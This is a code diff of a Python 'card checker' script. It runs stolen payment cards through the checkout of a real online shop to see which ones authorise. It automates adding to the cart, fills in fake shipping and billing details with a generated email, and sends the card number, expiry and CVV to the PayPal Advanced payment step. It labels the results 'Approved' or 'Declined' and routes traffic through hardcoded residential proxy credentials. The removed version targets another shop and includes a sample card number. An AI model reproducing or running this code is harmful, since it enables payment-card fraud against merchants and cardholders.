@@ -1,181 +1,370 @@
+import base64
 import random
-import re
+import uuid
 import names
+from bs4 import BeautifulSoup
 from requests import Session
 from dataclasses import dataclass
-import requests
-import uuid
-from fake_useragent import UserAgent
-from bs4 import BeautifulSoup
+
+def cut_str(text: str, a: str, b: str) -> str:
+    try:
+        return text.split(a)[1].split(b)[0]
+    except IndexError:
+        print(f"Error: No se pudo cortar la cadena entre '{a}' y '{b}'")
+        return None
 
 class ConfigsPAge:
     @classmethod
+    def SessionId(self):
+        self.id = str(uuid.uuid4())
+        return self.id
+    
     def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):
 
         try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
         except ValueError: return None 
+    
+    def DecodeBear(self, dato:str = None):
+        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
+        self.bear_end = ConfigsPAge().cu(self._tokenEncoding, '"authorizationFingerprint":"', '","')
+
+        return self.bear_end
 
     @classmethod
     def RandomName(self, dato: str = None):
-        if dato == 'email':
+        if dato == 'username':
+            self.username = "{}{}{}".format(
+                names.get_first_name(),
+                names.get_last_name(),
+                random.randint(1000000, 9999999)
+            )
+            return self.username
+        elif dato == 'email':
             self.email = "{}{}{}@gmail.com".format(
                 names.get_first_name(),
                 names.get_last_name(),
                 random.randint(1000000, 9999999)
             )
             return self.email
-        
+        elif dato == 'password':
+            self.password = "{}{}#{}".format(
+                names.get_first_name(),
+                names.get_last_name(),
+                random.randint(1000000, 9999999)
+            )
+            return self.password
+        elif dato == 'numero':
+            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
+            return self.number
         else:
             return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'
 
+    def SaveResponseHtml(self, response: str):
+        try:
+            with open("ResponseHtml.html", "w", encoding="utf-8") as f:
+                f.write(response)
+        except Exception as e:
+            print(f"Error guardando el archivo: {e}")
+
+# Proxy
+
+
 @dataclass
-class payflow_pro:
+class b3:
     def main(self, card):
         try:
             self.UseMail = ConfigsPAge().RandomName('email')
-            self.card = card
-            self.ccs = card.split('|')
-            if self.ccs[0].startswith("4"): self.brand = "VI"
-            if self.ccs[0].startswith("3"): self.brand = "AE"
-            elif self.ccs[0].startswith("5"): self.brand = "MC"
-            session = requests.Session()
+            
+            cc = card.split("|")
+            if len(cc[0]) == 16:
+                if cc[0].startswith('4'):cctype = 'VISA'
+                elif cc[0].startswith('5'):cctype = 'MASTERCARD'
+                elif (cc[0].startswith('6011') or
+                    cc[0].startswith(('622', '644', '645', '646', '647', '648', '649')) or
+                    cc[0].startswith('65')):
+                    cctype = 'DISCOVER'
+                elif len(cc[0]) == 15 and cc[0].startswith(('34', '37')):cctype = 'AMEX'
+                else:cctype = 'Unknown'
+            elif len(cc[0]) == 15:  
+                if cc[0].startswith(('34', '37')):cctype = 'AMEX'
+                else:cctype = 'Unknown'
+            else:cctype = 'Unknown'
 
-            Agent = UserAgent().random
-            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
-            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
-            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'
+            self.session = Session()
+            self.session.proxies.update({'http': "http://f880b05d3961fd7b:1Dpwz5cmSVkqJT3Y@res.proxy-seller.com:10000",'https': "http://112c3b382c0a58e5:3oRFh1gfvEzUxn4m@res.proxy-seller.com:10000"})
             
             headers = {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                "Accept-Language": "es-ES,es;q=0.8",
-                "Referer": "https://www.funkyfriendsfactory.com/",
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'es-ES,es;q=0.9',
+                'cache-control': 'max-age=0',
+                'priority': 'u=0, i',
+                'referer': 'https://www.artificialplantsandtrees.com/accessories.html',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                 }
+            r1 = self.session.get('https://www.artificialplantsandtrees.com/NEA2456.html', headers=headers)
+
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'es-ES,es;q=0.9',
+                'cache-control': 'max-age=0',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.artificialplantsandtrees.com',
+                'priority': 'u=0, i',
+                'referer': 'https://www.artificialplantsandtrees.com/NEA2456.html',
+                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                }
+
+            params = ''
+
+            data = {'Action': 'ADPR','Screen': 'BASK','Store_Code': 'trees','Session_ID': 'd0625b75c20e4dfc10c03bc0a55cedb4','Product_Code': 'NEA2456','Product_ID': '16033','quantity': '1',}
+            r2 = self.session.post('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,data=data,)
+
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'es-ES,es;q=0.9',
+                'priority': 'u=0, i',
+                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?','upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                 }
+            params = {
+                'Screen': 'OINF',
+                'Store_Code': 'trees',
+            }
+            r3 = self.session.get('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,)
+
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'es-ES,es;q=0.9',
+                'priority': 'u=0, i',
+                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?Screen=OINF&Store_Code=trees',
+                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                # 'cookie': 'mm5-trees-basket-id=d0625b75c20e4dfc10c03bc0a55cedb4; _vwo_uuid_v2=D1488DA02C26C3AB5C59647AD93245297|af196c58f4a3ff5665ba0cba44cdd9b5; cto_bundle=q7qxMF9mOVc2dGRIQ1VxVUk0WWVXSlZqc1ZpQ0tacjVIUDFTb2JWJTJCMGxHdEt5UWJNaE5qenVNS3E5VjFranBZNHglMkJJcXd5Z0RnR2xDV2ZiT3UydDNkeXdZdFlhNnZuRU5naWZHJTJGRWJQdVYlMkJhU3MlMkZZZFBpVjNIcXhxRUk2WGJyTlZFNjNBS0VlWlRCVGRKS3AyWTZSbFVtak9nJTNEJTNE',
             }
 
-            response = session.get(
-                'https://www.funkyfriendsfactory.com/mrs-claus-christmas-doll-sewing-pattern-pdf',
-                headers=headers,
-            ).text
-            form_key = re.search(r'form_key/([^/]+)', response).group(1)
-            if "form_key" not in response:
-                print("NO SESSION VALID")
-            headers = {
-                "User-Agent": headers["User-Agent"],
-                "Accept": "*/*",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "X-Requested-With": "XMLHttpRequest",
-                "Origin": "https://www.funkyfriendsfactory.com",
-                "Referer": "https://www.funkyfriendsfactory.com/maximus-mouse-sewing-pattern",
+            params = {
+                'Store_Code': 'trees',
+                'Screen': 'OCST',
             }
+
+            r4 = self.session.get('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,)
+
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'es-ES,es;q=0.9',
+                'cache-control': 'max-age=0',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.artificialplantsandtrees.com',
+                'priority': 'u=0, i',
+                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?Store_Code=trees&Screen=OCST',
+                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                # 'cookie': 'mm5-trees-basket-id=d0625b75c20e4dfc10c03bc0a55cedb4; _vwo_uuid_v2=D1488DA02C26C3AB5C59647AD93245297|af196c58f4a3ff5665ba0cba44cdd9b5; cto_bundle=q7qxMF9mOVc2dGRIQ1VxVUk0WWVXSlZqc1ZpQ0tacjVIUDFTb2JWJTJCMGxHdEt5UWJNaE5qenVNS3E5VjFranBZNHglMkJJcXd5Z0RnR2xDV2ZiT3UydDNkeXdZdFlhNnZuRU5naWZHJTJGRWJQdVYlMkJhU3MlMkZZZFBpVjNIcXhxRUk2WGJyTlZFNjNBS0VlWlRCVGRKS3AyWTZSbFVtak9nJTNEJTNE',
+            }
+
+            params = ''
 
             data = {
-                'product': '566',
-                'qty': '1',
-                'ajax_package_name': 'default',
-                'ajax_layout': 'orangemantra',
-                'ajax_template': 'orangemantra',
-                'ajax_skin': 'orangemantra',
+                'Action': 'ORDR',
+                'Screen': 'OUSL',
+                'Store_Code': 'trees',
+                'ShipFirstName': 'deerek',
+                'ShipLastName': 'delan',
+                'ShipEmail': self.UseMail,
+                'ShipPhone': '5667879654',
+                'ShipFax': '',
+                'ShipCompany': '',
+                'ShipAddress1': 'times square 20',
+                'ShipAddress2': '',
+                'ShipCity': 'new york',
+                'ShipStateSelect': 'NY',
+                'ShipState': '',
+                'ShipZip': '10010',
+                'ShipCountry': 'US',
+                'billing_to_show': '1',
+                'BillFirstName': 'deerek',
+                'BillLastName': 'delan',
+                'BillEmail': self.UseMail,
+                'BillPhone': '5667879654',
+                'BillFax': '',
+                'BillCompany': '',
+                'BillAddress1': 'times square 20',
+                'BillAddress2': '',
+                'BillCity': 'new york',
+                'BillStateSelect': 'NY',
+                'BillState': '',
+                'BillZip': '10010',
+                'BillCountry': 'US',
             }
-
-            response = session.post(
-                f'https://www.funkyfriendsfactory.com/ajaxcart/cart/add/uenc/aHR0cHM6Ly93d3cuZnVua3lmcmllbmRzZmFjdG9yeS5jb20vbXJzLWNsYXVzLWNocmlzdG1hcy1kb2xsLXNld2luZy1wYXR0ZXJuLXBkZg,,/product/566/form_key/{form_key}/',
-                headers=headers,
-                data=data,
-            )
-            cart = session.get("https://www.funkyfriendsfactory.com/checkout/cart/").text
-
-            print("ITEM IN CART:", "Maximus Mouse" in cart or "537671" in cart)
+            r5 = self.session.post('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,data=data,)
 
             headers = {
-                "User-Agent": headers["User-Agent"],
-                "Accept": "*/*",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "X-Requested-With": "XMLHttpRequest",
-                "Origin": "https://www.funkyfriendsfactory.com",
-                "Referer": "https://www.funkyfriendsfactory.com/onestepcheckout/index/",
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'es-ES,es;q=0.9',
+                'cache-control': 'max-age=0',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.artificialplantsandtrees.com',
+                'priority': 'u=0, i',
+                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?',
+                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                # 'cookie': 'mm5-trees-basket-id=d0625b75c20e4dfc10c03bc0a55cedb4; _vwo_uuid_v2=D1488DA02C26C3AB5C59647AD93245297|af196c58f4a3ff5665ba0cba44cdd9b5; cto_bundle=q7qxMF9mOVc2dGRIQ1VxVUk0WWVXSlZqc1ZpQ0tacjVIUDFTb2JWJTJCMGxHdEt5UWJNaE5qenVNS3E5VjFranBZNHglMkJJcXd5Z0RnR2xDV2ZiT3UydDNkeXdZdFlhNnZuRU5naWZHJTJGRWJQdVYlMkJhU3MlMkZZZFBpVjNIcXhxRUk2WGJyTlZFNjNBS0VlWlRCVGRKS3AyWTZSbFVtak9nJTNEJTNE; mm5-trees-checkout-session=4499748e54c1758980453b7d5377b4e3',
             }
 
-            response = session.get('https://www.funkyfriendsfactory.com/checkout/cart/',  headers=headers)
-
-            headers = {
-                "User-Agent": headers["User-Agent"],
-                "Accept": "*/*",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "X-Requested-With": "XMLHttpRequest",
-                "Origin": "https://www.funkyfriendsfactory.com",
-                "Referer": "https://www.funkyfriendsfactory.com/onestepcheckout/index/",
-            }
-
-            response = session.get('https://www.funkyfriendsfactory.com/onestepcheckout/index/', headers=headers)
-
-            print("shipping_method" in session.get("https://www.funkyfriendsfactory.com/onestepcheckout/index/").text.lower())
-            headers = {
-                "User-Agent": headers["User-Agent"],
-                "Accept": "*/*",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "X-Requested-With": "XMLHttpRequest",
-                "Origin": "https://www.funkyfriendsfactory.com",
-                "Referer": "https://www.funkyfriendsfactory.com/onestepcheckout/index/",
-            }
+            params = ''
 
             data = {
-                'billing[address_id]': '693175',
-                'billing[firstname]': 'ldfl',
-                'billing[lastname]': 'dsdasd',
-                'billing[email]': self.UseMail,
-                'billing[street][]': [
-                    'moall del sol',
-                    'sadw',
-                ],
-                'billing[country_id]': 'US',
-                'billing[city]': 'Miami',
-                'billing[postcode]': '34112',
-                'billing[region_id]': '43',
-                'billing[region]': '',
-                'billing[customer_password]': 'leito132asd',
-                'billing[confirm_password]': 'leito132asd',
-                'billing[save_in_address_book]': '1',
-                'billing[use_for_shipping]': '1',
-                'emailvalid': 'valid',
-                'payment[method]': 'paypal_direct',
-                'payment[cc_type]': self.brand,
-                'payment[cc_number]': self.ccs[0],
-                'payment[cc_exp_month]': self.ccs[1],
-                'payment[cc_exp_year]': self.ccs[2],
-                'payment[cc_cid]': self.ccs[3],
-                'qty-item-537671': '1',
-                'remove': '0',
-                'coupon_code': '',
-                'terms_conditions_checkbox': '1',
+                'Screen': 'OPAY',
+                'Action': 'SHIP,PSHP,CTAX',
+                'Store_Code': 'trees',
+                'spammer': '',
+                'ShippingMethod': 'subtotsz:Ground',
+                'PaymentMethod': 'paypaladv:VISA',
+                'add1': '',
             }
 
-            r = session.post(
-                "https://www.funkyfriendsfactory.com/onestepcheckout/index/saveOrder/",
-                headers=headers,
-                data=data
-            )
+            r6 = self.session.post('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,data=data,)
 
-            soup = BeautifulSoup(r.text, "html.parser")
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'es-ES,es;q=0.9',
+                'cache-control': 'max-age=0',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.artificialplantsandtrees.com',
+                'priority': 'u=0, i',
+                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?',
+                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                # 'cookie': 'mm5-trees-basket-id=d0625b75c20e4dfc10c03bc0a55cedb4; _vwo_uuid_v2=D1488DA02C26C3AB5C59647AD93245297|af196c58f4a3ff5665ba0cba44cdd9b5; cto_bundle=q7qxMF9mOVc2dGRIQ1VxVUk0WWVXSlZqc1ZpQ0tacjVIUDFTb2JWJTJCMGxHdEt5UWJNaE5qenVNS3E5VjFranBZNHglMkJJcXd5Z0RnR2xDV2ZiT3UydDNkeXdZdFlhNnZuRU5naWZHJTJGRWJQdVYlMkJhU3MlMkZZZFBpVjNIcXhxRUk2WGJyTlZFNjNBS0VlWlRCVGRKS3AyWTZSbFVtak9nJTNEJTNE; mm5-trees-checkout-session=4499748e54c1758980453b7d5377b4e3',
+            }
 
-            error = soup.find(class_="error-msg")
+            params = ''
 
-            mensaje = None
+            data = {
+                'Action': 'AUTH',
+                'Screen': 'INVC',
+                'spammer': '',
+                'Store_Code': 'trees',
+                'PaymentMethod': f'paypaladv:{cctype}',
+                'SplitPaymentData': '',
+                'PayPalAdv_CardNumber': cc[0],
+                'PayPalAdv_CardExp_Month': cc[1],
+                'PayPalAdv_CardExp_Year': cc[2],
+                'PayPalAdv_CardCvv': cc[3],
+            }
 
-            if error:
-                mensaje = error.get_text(" ", strip=True)
+            r7 = self.session.post('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,data=data,)
+            
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'es-ES,es;q=0.9',
+                'priority': 'u=0, i',
+                'referer': 'https://www.artificialplantsandtrees.com/',
+                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                }
 
-            if mensaje is None:
-                return 'Approved! ✅', 'Charged $12.99'
+            params = {
+                'Screen': 'BASK',
+            }
+            r8 = self.session.get('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,)
 
-            elif 'Please enter a valid Credit Card Verification Number' in mensaje:
-                return 'Approved! ✅', 'CVV2 Mismatch: 15004'
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'es-ES,es;q=0.9',
+                'cache-control': 'max-age=0',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://www.artificialplantsandtrees.com',
+                'priority': 'u=0, i',
+                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?Screen=BASK',
+                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+                 }
 
-            elif '#15005' in mensaje:
-                return 'Declined! ❌', '15005 Processor Decline'
+            data = {
+                'Action': 'RGRP',
+                'Basket_Group': '242376',
+                'Offset': '',
+                'AllOffset': '',
+                'CatListingOffset': '',
+                'RelatedOffset': '',
+                'SearchOffset': '',
+            }
 
+            r9 = self.session.post('https://www.artificialplantsandtrees.com/BASK.html', headers=headers, data=data)
+
+            ConfigsPAge().SaveResponseHtml(r7.text)
+            if 'succes' in r7.text:
+                return 'Approved! ✅','Charged $4.99'
+
+            elif 'Unable to authorize payment: CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in r7.text:
+                return 'Approved! ✅', 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'
+            
+            elif 'One or more required fields were not filled out correctly.' in r7.text:
+                return 'Approved! ✅', 'Verified: 10574-This card authorization verification is not a payment transaction.'
+            
+            
             else:
-                return 'Declined! ❌', mensaje
+                soup = BeautifulSoup(r7.text, 'html.parser')
+                error_p = soup.find('div', class_='error-message')
+                if error_p:
+                    error_message = error_p.get_text(separator=' ').strip()
+                    return 'Declined! ❌', error_message
+                else:
+                    return 'Declined! ❌', 'Declined - This transaction cannot be processed'
 
-        except Exception as e:
-            return 'Declined! ❌', f'error gate: {e}'
-print(payflow_pro().main('4110905024362674|09|2029|125'))
+
+
+        except: 
+            return 'Declined! ❌','error'
